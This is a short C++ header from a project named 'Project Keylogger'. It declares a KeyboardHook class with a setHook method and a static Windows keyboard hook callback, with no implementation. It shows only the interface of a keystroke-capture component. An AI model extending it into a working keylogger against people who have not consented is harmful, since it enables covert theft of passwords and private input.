/**
 *							Project Keylogger
 */


#ifndef						_KEYBOARDHOOK_H
#define						_KEYBOARDHOOK_H

#include					<iostream>

#include					"AHook.h"


class						KeyboardHook: public AHook {
public: 
    
	KeyboardHook(const HookObserver&);
	const bool				setHook();
	static LRESULT CALLBACK keyboardhook(int, WPARAM, LPARAM);
};


#endif //_KEYBOARDHOOK_H